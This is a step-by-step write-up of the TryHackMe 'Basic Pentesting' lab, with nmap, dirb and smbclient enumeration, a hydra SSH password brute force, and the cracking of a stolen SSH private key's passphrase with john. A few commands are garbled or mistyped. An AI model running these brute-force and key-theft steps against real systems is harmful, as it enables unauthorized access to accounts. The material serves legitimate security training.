# basicpentesting_tryhackme
STEP1: nmap -sS -A -T4 <ip_address>

It gives all the open ports and services on which it's working.

example: nmap -sS -A -T5 10.10.59.33                                                                                                      130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 01:11 EDT
Warning: 10.10.59.33 giving up on port because retransmission cap hit (2).
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 01:12 (0:00:02 remaining)
Nmap scan report for 10.10.59.33
Host is up (0.026s latency).
Not shown: 916 closed ports, 78 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Device type: bridge|general purpose|switch
Running (JUST GUESSING): Oracle Virtualbox (97%), QEMU (92%), Bay Networks embedded (87%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:qemu:qemu cpe:/h:baynetworks:baystack_450
Aggressive OS guesses: Oracle Virtualbox (97%), QEMU user mode network gateway (92%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-07-16T01:12:04-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-16T05:12:04
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.25 ms 10.0.2.2
2   2.09 ms 10.10.59.33

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.36 seconds
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
STEP 2: dirb http://<ip address>
 
  dirb is a web content scanner.  It looks for existing (and/or hidden) Web Objects.
  
  After the scanning is done we get /development file. 
  
  In the /development file we found dev.txt and j.txt files.
  ![Screenshot (61)](https://user-images.githubusercontent.com/63544231/125895959-ede9d4ca-bc32-4fb6-aec3-b766106dcefb.png)
![o2](https://user-images.githubusercontent.com/63544231/125896491-49dafd38-cdb7-4e75-a928-2466e38a5634.PNG)
![o3](https://user-images.githubusercontent.com/63544231/125896495-7ff29572-c1a3-426f-8aa2-314dcffb44a4.PNG)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 3: smbclient //<ip_address>/Anonymous
 
  Example: smbclient //10.10.59.33/Anonymous                                                                                                130 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11093832 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
  exit from the smbclient and comeback to root. 
  In root type cat staff.txt
  In staff.txt we get two names [jan,kay]
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 4: hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<ip_address>
  
  hydra is used for cracking the passwords from the rockyou.txt file 
 
  ![o4](https://user-images.githubusercontent.com/63544231/125897495-d9199952-d2ef-43f5-9d0c-f7819cda2ba2.PNG)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 5: We have to enter into jan with password
 
  ssh jan@<ipaddress>

  ssh jan@10.10.59.33              
jan@10.10.59.33's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Jul 16 00:01:58 2021 from 10.9.5.196
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 6: Through jan we have to get into kay and find the other password
  
  for that type /home/kay
  
  then ls 
 
  we get pass.bak file 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 7: WE  HAVE TO CRACK THE PASSPHRASE FOR Kay
  
  first is to get into .ssh
  
  for that we have to type cd .ssh
  
  after that we have to see id_rsa file 
 
  for that we have to type cat id_rsa
 
  next step is copy the contents of the id_rsa 
  
  next is open other terminal and create one file[kay_id_rsa] and save the content into that file.

  then type chmod 600 kay_id_rsa 
  
  THEN type /usr/share/john/ssh2john.txt 
 
  then type /usr/share/john/ssh2john.txt > forjohn.txt
  
  then TYPE john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
  
  we get the paraphrase beeswax 
  ohn --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt                                                                     255 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)
1g 0:00:00:10 DONE (2021-07-16 01:59) 0.09852g/s 1412Kp/s 1412Kc/s 1412KC/sa6_123..*7¡Vamos!
Session completed
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 8: NOW WE HAVE TO FIND THE PASSWORD FOR KAY

  FOR THAT THING TYPE ssh -i kay_id_rsa kay@<ip_address>
 
  password is beeswax
 
  then ls
 
  we get pass.bak
  
  in pass.bak we get the password for kay.
  
  
  THIS IS THE PROCEDURE FOR BASIC PENTESTING.
  

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
